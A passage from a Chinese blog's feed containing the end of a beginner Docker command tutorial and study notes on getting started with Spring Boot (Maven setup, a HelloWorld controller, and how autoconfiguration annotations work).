world测试</h3><p>任何技术的学习，我们都离不开<code>Hello world</code>，Docker也不例外，下面我们来使用Docker来运行一下<code>Hello world</code>吧，在测试之前我们首先使用如下命令来启动Docker:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Docker的启动</span></span><br><span class="line">systemctl <span class="keyword">start</span> docker</span><br><span class="line"><span class="comment"># Docker的重启</span></span><br><span class="line">systemctl restart docker</span><br><span class="line"><span class="comment"># Docker的开机自启动</span></span><br><span class="line">systemctl <span class="keyword">enable</span> docker     <span class="comment"># 一般我们使用开机自启动的形式</span></span><br></pre></td></tr></table></figure></p><p>启动好Docker之后，我们来在Docker中运行一下hello world：<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker 运行hello world</span></span><br><span class="line">docker <span class="keyword">run</span><span class="bash"> hello-world</span></span><br></pre></td></tr></table></figure></p><p>在我们执行<code>docker run hello-world</code>之后，Docker首先会根据我们的命令查看一下本地是否存在<code>hello-world</code>镜像，如果存在则会直接运行，如果不存在就会去中央仓库中拉取（下载）<code>hello-world</code>镜像（拉取过程极为迅速）之后再来运行。由于我们首次使用Docker，所以执行之后会出现以下结果：<br><img><br>由于Docker已经帮我们拉取了<code>hello-world</code>镜像，所以当我们再次运行<code>docker run hello-world</code>之后，则会出现如下结果：<br><img></p><p>顺便一提，我们在使用Docker拉取所拉取的所有镜像都来源于Docker的中央仓库，里面存放了大量的镜像可供我们自由使用：<a href="https://hub.docker.com/" target="_blank" rel="noopener">https://hub.docker.com/</a><br><img></p><h2 id="Docker的基本使用"><a href="#Docker的基本使用" class="headerlink" title="Docker的基本使用"></a>Docker的基本使用</h2><ul><li><p>启动docker <code>systemctl start docker</code>，重启<code>systemctl restart docker</code>，开机docker自启动<code>systemctl enable docker</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Docker的启动</span></span><br><span class="line">systemctl <span class="keyword">start</span> docker</span><br><span class="line"><span class="comment"># Docker的重启</span></span><br><span class="line">systemctl restart docker</span><br><span class="line"><span class="comment"># Docker的开机自启动</span></span><br><span class="line">systemctl <span class="keyword">enable</span> docker     <span class="comment"># 一般我们使用开机自启动的形式</span></span><br></pre></td></tr></table></figure></li><li><p>使用<code>search</code>命令来检索中央仓库中收录的镜像，以<code>tomcat</code>为例</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 检索镜像：docker <span class="built_in">search</span> [镜像名称]</span><br><span class="line">docker <span class="built_in">search</span> tomcat</span><br></pre></td></tr></table></figure></li></ul><p><img></p><ul><li><p>拉取（下载）镜像：<code>docker pull tomcat</code>(默认最新版本)</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 拉取镜像：<span class="selector-tag">docker</span> <span class="selector-tag">pull</span> <span class="selector-attr">[镜像名称]</span></span><br><span class="line"><span class="selector-tag">docker</span> <span class="selector-tag">pull</span> <span class="selector-tag">tomcat</span></span><br><span class="line"># 默认拉取的是最新版本，如果需要特定版本，在后面指定即可，以<span class="selector-tag">tomcat7</span><span class="selector-class">.0</span><span class="selector-class">.1</span>为例</span><br><span class="line"><span class="selector-tag">docker</span> <span class="selector-tag">pull</span> <span class="selector-tag">tomcat</span><span class="selector-pseudo">:7.0.1</span></span><br></pre></td></tr></table></figure></li><li><p>查看已经下载的本地镜像：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看已经下载的本地镜像</span></span><br><span class="line"><span class="attribute">docker</span> images</span><br></pre></td></tr></table></figure></li></ul><p><img></p><ul><li><p>删除本地镜像</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除本地镜像: docker rmi 镜像名称/IMAGE ID</span></span><br><span class="line"><span class="attribute">docker</span> rmi tomcat</span><br></pre></td></tr></table></figure></li><li><p>根据镜像启动对应的容器</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 根据镜像启动对应的容器</span></span><br><span class="line">docker run -d --name mytomcat tomcat</span><br><span class="line"><span class="meta"># --name 对容器起一个别名</span></span><br><span class="line"><span class="meta"># -d 对指定的容器进行后台运行</span></span><br></pre></td></tr></table></figure></li><li><p>停止运行的容器 </p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 停止运行的容器：docker <span class="built_in">stop</span> 容器名称/CONTAINER ID</span><br><span class="line">docker <span class="built_in">stop</span> mytomcat</span><br></pre></td></tr></table></figure></li><li><p>查看正在运行的容器</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps       <span class="comment"># 查看正在运行的容器</span></span><br><span class="line">docker ps -<span class="keyword">a</span>    <span class="comment"># 查看本地所有的容器</span></span><br></pre></td></tr></table></figure></li><li><p>删除容器</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注：删除容器是使用rm，删除镜像是rmi，且删除镜像之前需要停止运行容器并删除</span></span><br><span class="line"><span class="attribute">docker</span> rm mytomcat</span><br></pre></td></tr></table></figure></li><li><p>启动一个做了端口映射的容器</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name mytomcat -p <span class="number">8888</span>:<span class="number">8080</span> tomcat</span><br><span class="line"><span class="meta"># --name：对容器起一个别名</span></span><br><span class="line"><span class="meta"># -p:将主机的端口映射到容器的一个端口  主机端口:容器内部的端口 </span></span><br><span class="line"><span class="meta"># -d:后台运行</span></span><br></pre></td></tr></table></figure></li><li><p>查看容器的日志<code>docker logs mytomcat</code><br><img></p></li><li><p>容器开机自起动：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker update mytomcat <span class="attribute">--restart</span>=always</span><br></pre></td></tr></table></figure></li><li><p>进入对应的容器</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -<span class="keyword">it</span> mytomcat /bin/bash</span><br></pre></td></tr></table></figure></li><li><p>本地文件（是centos不是windows）与docker容器中文件之间的互传，以将ik分词器插件上传至elasticsearch容器为例：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先将windows上的文件使用xftp上传到vmware linux中，然后将文件使用docker命令上传到docker容器中</span></span><br><span class="line"><span class="comment"># docker cp 本地路径 容器名:容器路径</span></span><br><span class="line">docker cp .<span class="regexp">/elasticsearch-analysis-ik-6.5.4.zip elasticsearch:/u</span>sr<span class="regexp">/share/</span>elasticsearch<span class="regexp">/plugins</span></span><br></pre></td></tr></table></figure></li></ul><p>注：以上指示Docker容器中常用的一些命令，对于不同的镜像的使用，其启动命令也是会有所区别，后面的一些命令会在使用的时候进行介绍，其他更多Docker操作可参考Docker官方文档：<br><a href="https://docs.docker.com/engine/reference/commandline/docker/" target="_blank" rel="noopener">https://docs.docker.com/engine/reference/commandline/docker/</a><br><img></p><h2 id="DockerFile"><a href="#DockerFile" class="headerlink" title="DockerFile"></a>DockerFile</h2>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;img src=&quot;https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1581752085473&amp;di=c4c4e3eda8cba3ae95fde0488ba1e44a&amp;imgtype=0&amp;src=http%3A%2F%2Fimg2018.cnblogs.com%2Fblog%2F1813823%2F201911%2F1813823-20191121223145795-1635208897.png&quot;&gt;&lt;/center&gt;

&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;相信点进这篇文章的Coder，不管是在各大技术论坛上、技术交流群，亦或招聘网上，应该都有见到过Doker容器技术的面孔，随着社会节奏的加快以及迫于生活的压力，在计算机技术日新月异的今天，真正能够沉下心来学习一门技术的时间真的不多。为了不让新型冠状病毒迅速蔓延，全国人民都居家隔离，趁着这段空闲的时间，我也该是时候把过去学习时所积累的笔记沉淀一下了。本文主要是从是什么、为什么、怎么做的角度来介绍Docker容器技术得入门，能让初次接触Docker容器技术的朋友更快的使用Docker。&lt;/p&gt;
    
    </summary>
    
      <category term="Docker" scheme="https://muzimz.cn/categories/Docker/"/>
    
    
      <category term="Docker" scheme="https://muzimz.cn/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Spring Boot如何学习？</title>
    <link href="https://muzimz.cn/2019/10/01/Spring%20Boot%E5%A6%82%E4%BD%95%E5%AD%A6%E4%B9%A0%EF%BC%9F/"/>
    <id>https://muzimz.cn/2019/10/01/Spring Boot如何学习？/</id>
    <published>2019-10-01T13:56:35.000Z</published>
    <updated>2020-02-21T02:49:19.651Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Spring-Boot如何学习？"><a href="#Spring-Boot如何学习？" class="headerlink" title="Spring Boot如何学习？"></a>Spring Boot如何学习？</h1><p><img src="https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=2551084964,3275034231&fm=26&gp=0.jpg"></p><h2 id="1、Spring-Boot-简介"><a href="#1、Spring-Boot-简介" class="headerlink" title="1、Spring Boot 简介"></a>1、Spring Boot 简介</h2><blockquote><p>简化Spring应用开发的一个框架；</p><p>整个Spring技术栈的一个大整合；</p><p>J2EE开发的一站式解决方案；</p></blockquote><h2 id="2、微服务"><a href="#2、微服务" class="headerlink" title="2、微服务"></a>2、微服务</h2><p>2014，martin fowler</p><p>微服务：架构风格（服务微化）</p><p>一个应用应该是一组小型服务；可以通过HTTP的方式进行互通；</p><p>单体应用：ALL IN ONE</p><p>微服务：每一个功能元素最终都是一个可独立替换和独立升级的软件单元；</p><p><a href="https://martinfowler.com/articles/microservices.html#MicroservicesAndSoa" target="_blank" rel="noopener">详细参照微服务文档</a></p><a id="more"></a><h2 id="3、环境准备"><a href="#3、环境准备" class="headerlink" title="3、环境准备"></a>3、环境准备</h2><p><a href="http://www.gulixueyuan.com/" target="_blank" rel="noopener">http://www.gulixueyuan.com/</a> 谷粒学院</p><p>环境约束</p><p>–jdk1.8：Spring Boot 推荐jdk1.7及以上；java version “1.8.0_112”</p><p>–maven3.x：maven 3.3以上版本；Apache Maven 3.3.9</p><p>–IntelliJIDEA2017：IntelliJ IDEA 2017.2.2 x64、STS</p><p>–SpringBoot 1.5.9.RELEASE：1.5.9；</p><p>统一环境；</p><h3 id="1、MAVEN设置；"><a href="#1、MAVEN设置；" class="headerlink" title="1、MAVEN设置；"></a>1、MAVEN设置；</h3><p>给maven 的settings.xml配置文件的profiles标签添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.8<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2、IDEA设置"><a href="#2、IDEA设置" class="headerlink" title="2、IDEA设置"></a>2、IDEA设置</h3><p>整合maven进来；</p><p><img src="images/搜狗截图20180129151045.png" alt="idea设置"></p><p><img src="images/搜狗截图20180129151112.png" alt="images/"></p><h2 id="4、Spring-Boot-HelloWorld"><a href="#4、Spring-Boot-HelloWorld" class="headerlink" title="4、Spring Boot HelloWorld"></a>4、Spring Boot HelloWorld</h2><p>一个功能：</p><p>浏览器发送hello请求，服务器接受请求并处理，响应Hello World字符串；</p><h3 id="1、创建一个maven工程；（jar）"><a href="#1、创建一个maven工程；（jar）" class="headerlink" title="1、创建一个maven工程；（jar）"></a>1、创建一个maven工程；（jar）</h3><h3 id="2、导入spring-boot相关的依赖"><a href="#2、导入spring-boot相关的依赖" class="headerlink" title="2、导入spring boot相关的依赖"></a>2、导入spring boot相关的依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3、编写一个主程序；启动Spring-Boot应用"><a href="#3、编写一个主程序；启动Spring-Boot应用" class="headerlink" title="3、编写一个主程序；启动Spring Boot应用"></a>3、编写一个主程序；启动Spring Boot应用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@SpringBootApplication</span> 来标注一个主程序类，说明这是一个Spring Boot应用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldMainApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Spring应用启动起来</span></span><br><span class="line">        SpringApplication.run(HelloWorldMainApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4、编写相关的Controller、Service"><a href="#4、编写相关的Controller、Service" class="headerlink" title="4、编写相关的Controller、Service"></a>4、编写相关的Controller、Service</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/hello"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello World!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5、运行主程序测试"><a href="#5、运行主程序测试" class="headerlink" title="5、运行主程序测试"></a>5、运行主程序测试</h3><h3 id="6、简化部署"><a href="#6、简化部署" class="headerlink" title="6、简化部署"></a>6、简化部署</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 这个插件，可以将应用打包成一个可执行的jar包；--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将这个应用打成jar包，直接使用java -jar的命令进行执行；</p><h2 id="5、Hello-World探究"><a href="#5、Hello-World探究" class="headerlink" title="5、Hello World探究"></a>5、Hello World探究</h2><h3 id="1、POM文件"><a href="#1、POM文件" class="headerlink" title="1、POM文件"></a>1、POM文件</h3><h4 id="1、父项目"><a href="#1、父项目" class="headerlink" title="1、父项目"></a>1、父项目</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">他的父项目是</span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">relativePath</span>&gt;</span>../../spring-boot-dependencies<span class="tag">&lt;/<span class="name">relativePath</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">他来真正管理Spring Boot应用里面的所有依赖版本；</span><br></pre></td></tr></table></figure><p>Spring Boot的版本仲裁中心；</p><p>以后我们导入依赖默认是不需要写版本；（没有在dependencies里面管理的依赖自然需要声明版本号）</p><h4 id="2、启动器"><a href="#2、启动器" class="headerlink" title="2、启动器"></a>2、启动器</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>spring-boot-starter</strong>-==web==：</p><p>​    spring-boot-starter：spring-boot场景启动器；帮我们导入了web模块正常运行所依赖的组件；</p><p>Spring Boot将所有的功能场景都抽取出来，做成一个个的starters（启动器），只需要在项目里面引入这些starter相关场景的所有依赖都会导入进来。要用什么功能就导入什么场景的启动器</p><h3 id="2、主程序类，主入口类"><a href="#2、主程序类，主入口类" class="headerlink" title="2、主程序类，主入口类"></a>2、主程序类，主入口类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@SpringBootApplication</span> 来标注一个主程序类，说明这是一个Spring Boot应用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldMainApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Spring应用启动起来</span></span><br><span class="line">        SpringApplication.run(HelloWorldMainApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>@<strong>SpringBootApplication</strong>:    Spring Boot应用标注在某个类上说明这个类是SpringBoot的主配置类，SpringBoot就应该运行这个类的main方法来启动SpringBoot应用；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target</span>(ElementType.TYPE)</span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Inherited</span></span><br><span class="line"><span class="meta">@SpringBootConfiguration</span></span><br><span class="line"><span class="meta">@EnableAutoConfiguration</span></span><br><span class="line"><span class="meta">@ComponentScan</span>(excludeFilters = &#123;</span><br><span class="line">      <span class="meta">@Filter</span>(type = FilterType.CUSTOM, classes = TypeExcludeFilter.class),</span><br><span class="line">      <span class="meta">@Filter</span>(type = FilterType.CUSTOM, classes = AutoConfigurationExcludeFilter.class) &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> SpringBootApplication &#123;</span><br></pre></td></tr></table></figure><p>@<strong>SpringBootConfiguration</strong>:Spring Boot的配置类；</p><p>​        标注在某个类上，表示这是一个Spring Boot的配置类；</p><p>​        @<strong>Configuration</strong>:配置类上来标注这个注解；</p><p>​            配置类 ——-  配置文件；配置类也是容器中的一个组件；@Component</p><p>@<strong>EnableAutoConfiguration</strong>：开启自动配置功能；</p><p>​        以前我们需要配置的东西，Spring Boot帮我们自动配置；@<strong>EnableAutoConfiguration</strong>告诉SpringBoot开启自动配置功能；这样自动配置才能生效；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AutoConfigurationPackage</span></span><br><span class="line"><span class="meta">@Import</span>(EnableAutoConfigurationImportSelector.class)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> EnableAutoConfiguration &#123;</span><br></pre></td></tr></table></figure><p>​          @<strong>AutoConfigurationPackage</strong>：自动配置包</p><p>​        @<strong>Import</strong>(AutoConfigurationPackages.Registrar.class)：</p><p>​        Spring的底层注解@Import，给容器中导入一个组件；导入的组件由AutoConfigurationPackages.Registrar.class；</p><p>==将主配置类（@SpringBootApplication标注的类）的所在包及下面所有子包里面的所有组件扫描到Spring容器；==</p><p>​    @<strong>Import</strong>(EnableAutoConfigurationImportSelector.class)；</p><p>​        给容器中导入组件？</p><p>​        <strong>EnableAutoConfigurationImportSelector</strong>：导入哪些组件的选择器；</p><p>​        将所有需要导入的组件以全类名的方式返回；这些组件就会被添加到容器中；</p><p>​        会给容器中导入非常多的自动配置类（xxxAutoConfiguration）；就是给容器中导入这个场景需要的所有组件，并配置好这些组件；        <img src="images/搜狗截图20180129224104.png" alt="自动配置类"></p><p>有了自动配置类，免去了我们手动编写配置注入功能组件等的工作；</p><p>​        SpringFactoriesLoader.loadFactoryNames(EnableAutoConfiguration.class,classLoader)；</p><p>==Spring Boot在启动的时候从类路径下的META-INF/spring.factories中获取EnableAutoConfiguration指定的值，将这些值作为自动配置类导入到容器中，自动配置类就生效，帮我们进行自动配置工作；==以前我们需要自己配置的东西，自动配置类都帮我们；</p><p>J2EE的整体整合解决方案和自动配置都在spring-boot-autoconfigure-1.5.9.RELEASE.jar；</p><p>​        </p><p>==Spring注解版（谷粒学院）==</p><h2 id="6、使用Spring-Initializer快速创建Spring-Boot项目"><a href="#6、使用Spring-Initializer快速创建Spring-Boot项目" class="headerlink" title="6、使用Spring Initializer快速创建Spring Boot项目"></a>6、使用Spring Initializer快速创建Spring Boot项目</h2><h3 id="1、IDEA：使用-Spring-Initializer快速创建项目"><a href="#1、IDEA：使用-Spring-Initializer快速创建项目" class="headerlink" title="1、IDEA：使用 Spring Initializer快速创建项目"></a>1、IDEA：使用 Spring Initializer快速创建项目</h3><p>IDE都支持使用Spring的项目创建向导快速创建一个Spring Boot项目；</p><p>选择我们需要的模块；向导会联网创建Spring Boot项目；</p><p>默认生成的Spring Boot项目；</p><ul><li>主程序已经生成好了，我们只需要我们自己的逻辑</li><li>resources文件夹中目录结构<ul><li>static：保存所有的静态资源； js css  images；</li><li>templates：保存所有的模板页面；（Spring Boot默认jar包使用嵌入式的Tomcat，默认不支持JSP页面）；可以使用模板引擎（freemarker、thymeleaf）；</li><li>application.properties：Spring Boot应用的配置文件；可以修改一些默认设置；</li></ul></li></ul><h3 id="2、STS使用-Spring-Starter-Project快速创建项目"><a 